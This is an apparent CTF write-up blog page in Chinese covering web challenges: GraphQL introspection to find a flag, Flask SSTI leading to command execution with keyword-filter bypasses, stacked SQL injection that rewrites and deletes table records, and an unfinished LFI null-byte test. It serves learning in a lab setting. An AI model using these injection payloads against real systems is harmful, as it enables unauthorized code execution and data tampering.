<h3 id="ezAPI"><a href="#ezAPI" class="headerlink" title="ezAPI"></a>ezAPI</h3><p>使用了一个数据库查询的API：GraphQL<br>快速利用工具：<a class="link"   href="https://ivangoncharov.github.io/graphql-voyager/" >GraphQL-Voyager-在线构建工具 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://ivangoncharov.github.io/graphql-voyager/" >graphdoc-本地构建工具 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://github.com/graphql/graphql-playground" >GraphQL-Playground-本地构建工具 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://graphql.org/swapi-graphql" >在线GraphiQL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>参考：<a class="link"   href="https://blog.csdn.net/wy_97/article/details/110522150" >渗透测试之graphQL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://segmentfault.com/a/1190000014131950" >30分钟理解GraphQL核心概念 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://hwlanxiaojun.github.io/2020/04/14/%E5%BD%93CTF%E9%81%87%E4%B8%8AGraphQL%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/#0x-02-%E8%AE%A4%E8%AF%86GraphQL" >当CTF遇上GraphQL的那些事 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>顺带还发现了一个非常有意思的东西：<a class="link"   href="https://github.com/lucasbento/graphql-pokemon" >GraphQL-Pokemon <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>后台的GraphQL发包，在客户端是抓不到的。构建工具可以根据返回包中所包含的各对象的定义、接口信息将对象结构可视化展现出来（绘制出）。GraphQL-Playground工具有打包好的release文件，直接下载最新版的”setup.exe”文件即可。</p>
<p>本题有源码，访问”&#x2F;<a class="link"   href="http://www.zip" 即可下载/">www.zip&quot;即可下载 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>尝试传入一些query，发现有用的payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&amp;data=&#123;&quot;query&quot;:&quot;query&#123;__type(name:\&quot;Int\&quot;)&#123;name&#125;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中的 <code>name:\&quot;Int\&quot;</code> 很有意思，换成单引号不行，去掉反斜杠也不行，换成 <code>\\\&quot;Int\\\&quot;</code> 的双重转义也不行，但是将 <code>\&quot;</code> URL编码成 <code>%5c%22</code> 后仍然可行。测试的shell是hackbar。</p>
<p>这说明hackbar上传输入框的内容时经历的过程是：先URL解码；再解析一次内容，反斜杠发生转义；再被发送给GraphQL解析一次。</p>
<p>在URL解码这一步，可以将输入框内的内容看做一整个字符串，它是不需要解析引号就能被识别的字符串（不解析引号意味着不需要反斜杠转义，也就不进行反斜杠转义），这一步会发生URL解码，解码完毕后这个字符串将去掉外面的那层“引号”，内容将被直接放入后端的php代码进行解析，我们猜测这一步得到的内容是：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1, data=&#123;&quot;query&quot;:&quot;query&#123;__type(name:\&quot;Int\&quot;)&#123;name&#125;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p>会发现它跟我们在hackbar输入框中输入的内容是完全一致的！也就是说从前端到后端这个传输过程只会经过一层URL解码，得到的内容将被原样放入代码中解析。</p>
<p>接下来后台再来解析上述内容，由于该内容此时已经等价于编程语句，要想识别其中的字符串需要解析引号，也就是此处的双引号将被解析，反斜杠转义自然就生效，被转义的引号逃过了语法分析被视为字符串，未被转义的引号被视为字符串的分界符，因此标识符 <code>id</code> 会得到 <code>Int</code> 类型的值 <code>1</code> ，标识符 <code>data</code> 会得到 <code>json或obj或字典</code> 类型的值 <code>&#123;&quot;query&quot;:&quot;query&#123;__type(name:\&quot;Int\&quot;)&#123;name&#125;&#125;&quot;&#125;</code> ，其中属性 <code>query</code> 对应字符串 <code>query&#123;__type(name:&quot;Int&quot;)&#123;name&#125;&#125;</code> 。得到的内容作为GraphQL的query被传递出去，至此第二层解析完毕，反斜杠得到了转义。第三层解析就是正常的GraphQL解析。</p>
<p>假设情况更改为 <code>\\\&quot;Int\\\&quot;</code> 会发生什么？第一层解析先进行URL解码，得到的内容从前端被原样发到后台，PHP将对该内容进行解析——语法分析：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1, data=&#123;&quot;query&quot;:&quot;query&#123;__type(name:\\\&quot;Int\\\&quot;)&#123;name&#125;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p>那么标识符 <code>data</code> 被赋给的值就变为了 <code>uery&#123;__type(name:\&quot;Int\&quot;)&#123;name&#125;&#125;</code> ，这个内容将被作为query原样发给GraphQL，显然GraphQL的语法并不能处理这个反斜杠（它本应只出现在引号内），因此query会失败，得到的响应会是NULL。</p>
<p>现在情况再次改变，变为 <code>&quot;Int&quot;</code> ，第一次解析去掉URL编码，PHP将面对的内容会是：<code>id=1, data=&#123;&quot;query&quot;:&quot;query&#123;__type(name:&quot;Int&quot;)&#123;name&#125;&#125;&quot;&#125;</code> ，显然 <code>&quot;query&#123;__type(name:&quot;Int&quot;)&#123;name&#125;&#125;&quot;</code> 将被识别为两个字符串中间夹着一个意义不明的 <code>Int</code> ——这显然不是PHP语法能接受的东西，不论最后这段内容被怎样处理，标识符 <code>data</code> 都将得到不合理内容，因此query将会再次失败。</p>
<p>上述的分析就是就是在剖析”转义”与”解码”的细节：</p>
<ul>
<li>是如何发生的？</li>
<li>发生在哪里？</li>
<li>什么时候发生？</li>
<li>意义是什么？</li>
</ul>
<p>这一直是一个让人头疼的地方，不论是在正则表达式中，还是在字符串解析时，一层套一层的转义，一遍又一遍的解码与编码总是让人摸不着头脑。但是现在我们知道了，hackbar输入框中的内容将会被原样传给后台，作为编程语句直接被语言解析；而在传给后台之前他将会被浏览器整个视为字符串，解析其中的URL编码后传给后端。</p>
<p>那么URL编码存在的意义又是什么？我猜想的是框中的内容其实并非直接被识别为字符串，这个过程浏览器也要进行”解析”，因此也会解析引号，为了避开这一点需要URL编码来逃逸引号等语法保留字。换句话说，所有的转义都是为了让一个shell逃逸语法关键字，对可视的内容进行语法分析，并正确且完整的提取出其中的字符串（将保留字识别为字符串而非语法要素）。当这个shell是浏览器时，逃逸的办法是进行URL编码——浏览器不认识反斜杠的转义，他当反斜杠是正常字符，但它不当百分号是正常字符，而是一个保留字，是URL编码的前缀；当shell是某个语言如PHP，那么反斜杠成了保留字，它是一个转义内容的前缀，而百分号则变为了普通字符。</p>
<p>那奇了怪了，输入内容没有进行URL编码，hackbar为什么也能正常处理？——不知道。也许是因为输入框中的内容就是直接被当做字符串的。因此我们再次更新一下对URL编码的理解，需要URL编码的是在浏览器与后端语言之间的某个shell。</p>
<p><a class="link"   href="https://cloud.tencent.com/developer/article/1442847" >为什么要进行URL编码！！！ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 这篇文章就提到，传输的内容在到达PHPshell之前还需要被服务端口读取与处理，这个过程就会用到URL编码——真正需要URL编码的shell其实是服务端口，而非浏览器，浏览器的inputBox中的内容都会被直接视为字符串，它并不需要编码来分析。</p>
<p>构造内省查询payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&amp;data=&#123;&quot;query&quot;:&quot;query IntrospectionQuery &#123;\n  __schema &#123;\n    queryType &#123; name &#125;\n    mutationType &#123; name &#125;\n    subscriptionType &#123; name &#125;\n    types &#123;\n      ...FullType\n    &#125;\n    directives &#123;\n      name\n      description\n      locations\n      args &#123;\n        ...InputValue\n      &#125;\n    &#125;\n  &#125;\n&#125;\nfragment FullType on __Type &#123;\n  kind\n  name\n  description\n  fields(includeDeprecated: true) &#123;\n    name\n    description\n    args &#123;\n      ...InputValue\n    &#125;\n    type &#123;\n      ...TypeRef\n    &#125;\n    isDeprecated\n    deprecationReason\n  &#125;\n  inputFields &#123;\n    ...InputValue\n  &#125;\n  interfaces &#123;\n    ...TypeRef\n  &#125;\n  enumValues(includeDeprecated: true) &#123;\n    name\n    description\n    isDeprecated\n    deprecationReason\n  &#125;\n  possibleTypes &#123;\n    ...TypeRef\n  &#125;\n&#125;\nfragment InputValue on __InputValue &#123;\n  name\n  description\n  type &#123; ...TypeRef &#125;\n  defaultValue\n&#125;\nfragment TypeRef on __Type &#123;\n  kind\n  name\n  ofType &#123;\n    name\n    ofType &#123;\n      kind\n      name\n      ofType &#123;\n        kind\n        name\n        ofType &#123;\n          kind\n          name\n          ofType &#123;\n            kind\n            name\n            ofType &#123;\n              kind\n              name\n              ofType &#123;\n                kind\n                name\n              &#125;\n            &#125;\n          &#125;\n        &#125;\n      &#125;\n    &#125;\n  &#125;\n&#125;&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>IntrospectionQuery</code> 前的 <code>query%20</code> 不能省略！注意引号后面还有一个花括号。</p>
<p>graphql-voyager提供了一个根据内省查询结果还原GraphQL结构的功能”IntroSpection”。但遇到的问题是响应的内容来自PHP的 <code>var_dump()</code> 函数，该函数格式化输出了类的信息，但却又不符合类的序列化格式，得到的内容无法直接反序列化PHP中的类。</p>
<p>只能观察响应内容，发现其中有一个频繁出现的关键词：<code>ffffllllaaagggg_1n_h3r3_flag</code> ，它被定义为某个类的name，猜测它是一种类型，构造查询语句：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">query&#123;__type(name:\&quot;ffffllllaaagggg_1n_h3r3_flag\&quot;)&#123;name\nfields&#123;name&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">=&gt; </span><br><span class="line">DEBUG: object(stdClass)#3 (1) &#123; [&quot;__type&quot;]=&gt; object(stdClass)#1 (2) &#123; [&quot;name&quot;]=&gt; string(28) &quot;ffffllllaaagggg_1n_h3r3_flag&quot; [&quot;fields&quot;]=&gt; array(1) &#123; [0]=&gt; object(stdClass)#2 (1) &#123; [&quot;name&quot;]=&gt; string(4) &quot;flag&quot; &#125; &#125; &#125; &#125;</span><br></pre></td></tr></table></figure></div>

<p>会发现它有一个flag字段，查询flag：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">query&#123;ffffllllaaagggg_1n_h3r3_flag&#123;flag&#125;&#125;</span><br><span class="line"></span><br><span class="line">=&gt;</span><br><span class="line">DEBUG: object(stdClass)#2 (1) &#123; [&quot;ffffllllaaagggg_1n_h3r3_flag&quot;]=&gt; array(1) &#123; [0]=&gt; object(stdClass)#1 (1) &#123; [&quot;flag&quot;]=&gt; string(42) &quot;flag&#123;4a902c8e-a8b5-ecfb-bee3-d6419865647c&#125;&quot; &#125; &#125; &#125;</span><br></pre></td></tr></table></figure></div>

<p>非常的奇妙，我还不是很理解graphql的语法，不知道直接查询一个类型为什么能查出东西来&#x3D; &#x3D;，总之flag放在 <code>ffffllllaaagggg_1n_h3r3_flag&#123;flag&#125;</code> 中，直接query查询即可获得：<code>flag&#123;4a902c8e-a8b5-ecfb-bee3-d6419865647c&#125;</code></p>
<p>还没完，结束了才想到可以不用内省查询，直接查找graphql已有的类型：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">query&#123;__schema&#123;types&#123;name&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>会发现有52个类型，里面就有”ffffllllaaagggg_1n_h3r3_flag”以及它的许多兄弟姐妹类型。</p>
<p>一张定制的表可以作为类型去定义其他表的成员，因此非内置类型的名字往往就是某一类表的类名，这类表实例化后归属于该类名，查询时提供查询条件，查询类名与关键字，就会根据特定的信息查询出类名下符合条件的实例表，并将关键字信息返回。因此查询类名可能就是在检索该类名下所有实例的关键字内容。</p>
<hr>
<h4 id="Tips："><a href="#Tips：" class="headerlink" title="Tips："></a>Tips：</h4><ul>
<li>浏览器的地址栏可以执行js代码，如使用 <code>javascript:location.href</code> 将会返回当前访问的网址未被各种编码处理之前的模样。<br><a class="link"   href="https://blog.csdn.net/qq_43363773/article/details/105127260" >JS BOM操作地址栏、浏览器信息 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 提供了一些操作指导。<br>有一个很类似的payload能读取到页面源码：<code>view-source:URL</code> ，浏览器地址栏真是个神奇的box。</li>
<li>当使用”html格式编辑内容”时，网页上的一些字符会出现变化，如大于号 <code>&gt;</code> 会变成 <code>&amp;gt</code> ，因此箭头 <code>=&gt;</code> 就会变成 <code>=&amp;gt</code></li>
</ul>
<h4 id="词本"><a href="#词本" class="headerlink" title="词本"></a>词本</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Implements: cn.接口,工具</span><br><span class="line">filed: cn.字段</span><br></pre></td></tr></table></figure></div>

<h2 id="WEB-Week3"><a href="#WEB-Week3" class="headerlink" title="WEB-Week3"></a>WEB-Week3</h2><h3 id="BabySSTI-One"><a href="#BabySSTI-One" class="headerlink" title="BabySSTI_One"></a>BabySSTI_One</h3><p>参考：<a class="link"   href="https://blog.csdn.net/calmegm/article/details/97390756" >Python沙箱逃逸总结 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://blog.csdn.net/shutTD/article/details/127167935" >NewStar BabySSTI_One-WP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>首先需要理解 <strong>Flask</strong> 的模板注入 <strong>SSTI</strong> 的含义，Flask套用了 <strong>Jajin2</strong> 的语法，通过 <code>&#123;&#123;a&#125;&#125;</code> 解析变量内容，通过 <code>&#123;% for i in range(10) %&#125;&#123;...&#125;&#123;% endif %&#125;</code> 来构造python的控制环境。注入前可以先做测试：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;7*&#x27;7&#x27;&#125;&#125; -&gt; &#x27;7777777&#x27;	# 说明是存在注入的，而且是flask</span><br></pre></td></tr></table></figure></div>

<p>通过注入可以获取python的一些内容，要想干坏事就需要利用python的魔术方法去获取一些特殊的函数，进而实现RCE。</p>
<p>手动测试，发现 <code>class, mro, init, base</code> 被过滤了。</p>
<p><code>__builtins__</code> 正常回显，但 <code>dir(__builtins__)</code> 或 <code>dir()</code> 都有问题，而且都没有输出；<code>__builtins__.__import__</code> 也不行。因此 <code>__builtins__</code> 无法利用。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a.__getattribute__(<span class="string">&#x27;__i&#x27;</span>+<span class="string">&#x27;nit__&#x27;</span>).__globals__</span><br><span class="line">a.__getattribute__(<span class="string">&#x27;__i&#x27;</span>+<span class="string">&#x27;nit__&#x27;</span>).__globals__.__builtins__</span><br></pre></td></tr></table></figure></div>

<p>上述语句可以访问到内容，并且有输出，进一步获取：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a.__getattribute__(<span class="string">&#x27;__i&#x27;</span>+<span class="string">&#x27;nit__&#x27;</span>).__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;ls&quot;</span>).read()</span><br></pre></td></tr></table></figure></div>

<p>通过内建函数的 <code>__import__</code> 调用到”os”包中的 <code>os.popen()</code> 函数，执行命令行，<code>read()</code> 将得到的结果返回。</p>
<p>此处 <code>flag, cat</code> 都遭到了过滤，<code>cat</code> 可以使用 <code>nl, head, tail</code> 等绕过，<code>flag</code> 使用 <code>f*</code> 绕过，因此payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;a.__getattribute__(&#x27;__i&#x27;+&#x27;nit__&#x27;).__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;nl /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>当获取了某个函数如 <code>a.__getattrbute(&#39;__i&#39;+&#39;nit__&#39;)</code> 或 <code>lipsum</code> 时，可以调用 <code>__globals__.__builtins__</code> 先获取变量空间，再获取内建函数，通过调用内建函数中的 <code>__import__</code> 可以获取到模块”os”中的命令行执行函数，从而实现RCE。</p>
<p>可行的payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;%print lipsum.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;nl /f*&#x27;).read()%&#125;</span><br><span class="line">----------------</span><br><span class="line">&#123;&#123;a.__getattribute__(&#x27;__i&#x27;+&#x27;nit__&#x27;).__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;nl /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="本地测试沙箱逃逸"><a href="#本地测试沙箱逃逸" class="headerlink" title="本地测试沙箱逃逸"></a>本地测试沙箱逃逸</h4><p>测试python沙箱逃逸的时候经常会发现，本地的环境与服务器的环境测试结果有很多不同，网上提供的逃逸payload在本地测试也常常是无效的。</p>
<p>为了更好的理解python的沙箱逃逸，决定在本地仔细地做一个测试。</p>
<ol>
<li><pre><code class="python">a.__getattribute__
-&gt; NameError: name &#39;a&#39; is not defined
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   在服务器上可以，在本地是完全不行的。lipsum也是，本地并没有这个模块，也不知道从哪出现的，更不清楚从何得知服务器上就有这个函数。</span><br><span class="line"></span><br><span class="line">2. 由于payload使用了 `__getattribute__()` 实现了绕过，尝试在本地用其他方式复现：</span><br><span class="line"></span><br><span class="line">   ```python</span><br><span class="line">   [].__getattribute__(&#x27;__cl&#x27;+&#x27;ass__&#x27;)</span><br><span class="line">   -&gt; &lt;class &#x27;list&#x27;&gt;	# 成功</span><br><span class="line">   </span><br><span class="line">   [].__getattribute__(&#x27;__cl&#x27;+&#x27;ass__&#x27;).__getattribute__(&#x27;__ba&#x27;+&#x27;se__&#x27;)</span><br><span class="line">   -&gt; TypeError: descriptor &#x27;__getattribute__&#x27; requires a &#x27;list&#x27; object but received a &#x27;str&#x27;</span><br></pre></td></tr></table></figure></div>

会看到当对某个基础类型调用 `__getattribute__` 函数时就会出现问题。
</code></pre>
</li>
<li><pre><code class="python">__builtins__.__import__(&#39;os&#39;).system(&#39;whoami&#39;)
-&gt; microwin10-2258\administrator
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">本地可以利用 `__builtins__` 直接访问到所需函数，但服务器上不行。</span><br><span class="line">通过 `__dict__` 来访问：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">__builtins__.__dict__[&#x27;__impo&#x27;+&#x27;rt__&#x27;](&#x27;os&#x27;).system(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure></div>

本地可行，字典的字符串取键可以帮助绕过过滤词。还可以通过转码：

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&quot;X19pbXBvcnRfXw==&quot;</span>.decode(base64)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">-&gt; AttributeError: <span class="string">&#x27;str&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;decode&#x27;</span></span><br></pre></td></tr></table></figure></div>

在本地函数 `decode` 并不适用于base64这类编码的，要使用base64编码解码需要用到特定的模块：

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">__builtins__.__dict__[<span class="built_in">str</span>(base64.b64decode(<span class="string">&quot;X19pbXBvcnRfXw==&quot;</span>), <span class="string">&quot;utf-8&quot;</span>)]</span><br><span class="line"></span><br><span class="line">-&gt; &lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;</span><br></pre></td></tr></table></figure></div>
</code></pre>
</li>
</ol>
<p><strong>Tips：</strong></p>
<ul>
<li><p><code>__mro__</code> 和 <code>mro()</code> 效果一样；<code>type(obj)</code> 和 <code>obj.__class__</code> 效果一样。</p>
</li>
<li><p><code>dir()</code> 返回当前范围内的变量、方法和定义的类型列表；带参数时返回参数的属性、方法列表。如果参数包含方法 <code>__dir__()</code> 则调用该方法。</p>
</li>
<li><p><code>__builtins__</code> 表示内建函数，可以是环境中的，亦或是某个特定函数的，它可以调取很广范围内的函数。</p>
</li>
<li><p>利用 <code>&lt;class &#39;list&#39;&gt;.__name__ == &quot;list&quot;</code> 可以获取类型描述的类型名称</p>
</li>
<li><p><code>__globals__: 对保存函数全局变量的字典的引用，即定义函数的模块的全局命名空间</code> 获取一系列变量</p>
</li>
<li><p><code>str(bytes, &quot;utf-8&quot;)</code> 可以将utf-8编码的byte类型的数据转换为相同的字符串。</p>
</li>
<li><pre><code class="python">import base64
base64.b64encode(&#39;__import__&#39;.encode(&#39;utf-8&#39;))
# =&gt; b&#39;X19pbXBvcnRfXw==&#39;
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  因为python3.x中字符都为unicode编码，而b64encode函数的参数为byte类型，所以必须先转码</span><br><span class="line"></span><br><span class="line">#### 词本</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
implement: vt. 实施，执行
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### multiSQL</span><br><span class="line"></span><br><span class="line">#### 解题及测试</span><br><span class="line"></span><br><span class="line">* 过滤了双引号，注释符 `#, --%20`，但单引号可以注入</span><br><span class="line"></span><br><span class="line">* 过滤了 `select, union`</span><br><span class="line"></span><br><span class="line">* 查看提示，这里可以堆叠注入。前端页面能回显输入框的内容不代表输入的内容全都被当做字符串处理了。</span><br><span class="line"></span><br><span class="line">  ```sql</span><br><span class="line">  1&#x27;; show databases;</span><br><span class="line">  -&gt;</span><br><span class="line">  english			</span><br><span class="line">  information_schema			</span><br><span class="line">  mysql			</span><br><span class="line">  performance_schema	</span><br></pre></td></tr></table></figure></div>

经过测试，查询语句后多出一个引号不会影响前面的查询结果正常输出，这里查询到数据库名称，猜得出来表名是&quot;english&quot;（英语四级嘛）。
</code></pre>
</li>
<li><p>比较：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 4;</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">5</span>;</span><br></pre></td></tr></table></figure></div>

<p>第一个payload有回显字段名，第二个payload没有响应，能说明只有四个字段（其实也看得出来）。真正的意义在于去掉分号肯定没有回显。因此在后置一个引号的情况下，前面一定需要一个分号来提前结束语句，从而使得前面查询的结果正确输出。<br>前面测试引号的时候，单引号注入也会导致界面没有响应。</p>
</li>
<li><p><code>show tables;</code> 会返回当前数据库的所有表，查询得到：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span></span><br><span class="line">score</span><br></pre></td></tr></table></figure></div>

<p>所以是”english”库中的”score”表，查看表结构：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; desc score;</span></span><br><span class="line"><span class="string">-&gt;</span></span><br><span class="line"><span class="string">username	varchar(255)	YES	</span></span><br><span class="line"><span class="string">listen	int(11)	YES	</span></span><br><span class="line"><span class="string">read	int(11)	YES	</span></span><br><span class="line"><span class="string">write	int(11)	YES</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>提示中显示用”update”来获取flag，显然是因为 <code>insert</code> 被过滤了（<code>create</code> 倒是能用，但是考虑到不能自己select表，因此没什么用，<code>delete</code> 也活着）。因此我们需要尝试更新表”score”，将flag插入其中，利用原有的查询查到flag。</p>
</li>
<li><p>首先update需要更改已有的记录，根据题目描述，亲爱的火华师傅应该是有记录的：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">火华</span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span></span><br><span class="line">姓名	听力	阅读	写作</span><br><span class="line">火华	<span class="number">11</span>	<span class="number">201</span>	<span class="number">212</span></span><br></pre></td></tr></table></figure></div>

<p>因此得到 <code>username=火华</code> . 然后就没思路了</p>
</li>
<li><p>看了<a class="link"   href="https://blog.csdn.net/shutTD/article/details/127157978" >别人的wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>发现：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1# </span></span><br><span class="line"><span class="string">-&gt;</span></span><br><span class="line"><span class="string">姓名	听力	阅读	写作</span></span><br><span class="line"><span class="string">火华	11	201	212</span></span><br></pre></td></tr></table></figure></div>

<p>所以这个库里其实就这一条记录（注释符是有用的啊）</p>
<p><code>update</code> 其实被过滤了！完全没有尝试过啊，真没发现&#x3D; &#x3D;</p>
</li>
<li><p>使用 <code>replace into table_name values(fd1, fd2, fd3, fd4)</code> 语句来更新表中的内容：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; replace into score values(&quot;火华&quot;, 200, 200, 200);</span></span><br></pre></td></tr></table></figure></div>

<p>然后再次查询火华，发现有两个：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">姓名	听力	阅读	写作</span><br><span class="line">火华	<span class="number">11</span>	<span class="number">201</span>	<span class="number">212</span></span><br><span class="line">火华	<span class="number">200</span>	<span class="number">200</span>	<span class="number">200</span></span><br></pre></td></tr></table></figure></div>

<p>尝试读取第二个，再验证：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">火华<span class="string">&#x27; limit 1,1;</span></span><br></pre></td></tr></table></figure></div>

<p>发现不行！需要删除低分的记录才能通过验证：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; delete from score where listen=11;</span></span><br></pre></td></tr></table></figure></div>

<p>然后再次验证，得到flag：<code>flag&#123;Ju3t_use_mo2e_t2en_0ne_SQL&#125;</code> </p>
</li>
<li><p>发现了神奇的问题，删除记录的时候，只有 <code>username, listen</code> 两个字段是有效的，<code>write, read</code> 完全没用！在本地sql上测试发现使用这两个字段名会报错；猜测是因为他俩本身是保留字，新建另一张表，字段名对应改为 <code>readn, writen</code> ，发现可以使用这两个字段进行删除操作！说明保留字的猜测是正确的。</p>
</li>
<li><p>看了wp才意识到自己忘了题目，题目上写着希望帮火华师傅改成绩通过学校验证，因此拿到flag的方式就是修改记录；而自己的思路主要是寻找数据库中的flag并放入可以查询的数据表中，或是通过改写服务器上的php文件来写入木马，从而得到后门，找到存在服务器中的flag。</p>
</li>
</ul>
<h3 id="IncludeTwo"><a href="#IncludeTwo" class="headerlink" title="IncludeTwo"></a>IncludeTwo</h3><p>LFI代表php本地文件 包含漏洞，RCE代表远程代码执行漏洞。</p>
<p>因此 <code>RCE via LFI</code> 表示依赖LFI实现的RCE</p>
<p>参考：<a class="link"   href="https://zhuanlan.zhihu.com/p/50445145" >PHP本地文件包含漏洞笔记 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://tttang.com/archive/1395/" >The End Of LFI <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://gitbook-88.gitbook.io/ctf-writeup/2022/2022-newstarctf/week3-includetwo" >[WEEK3]IncludeTwo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><ul>
<li><pre><code>file=index
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">会产生递归调用的效果，不断出现新的index代码，当加上空字符就无效：</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
file=index%00
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">猜测可以实现00截断，PHP版本低于5.3.4，但是尝试了</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
?file=index.php%00
